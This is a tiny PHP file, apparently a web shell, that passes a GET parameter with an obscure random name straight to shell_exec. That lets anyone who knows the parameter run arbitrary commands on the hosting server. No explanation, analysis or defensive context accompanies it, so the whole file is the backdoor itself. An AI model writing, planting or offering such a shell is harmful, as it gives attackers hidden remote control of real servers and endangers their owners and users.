<?php
shell_exec(＄_GET['Dv3Kz_NG']);
?>
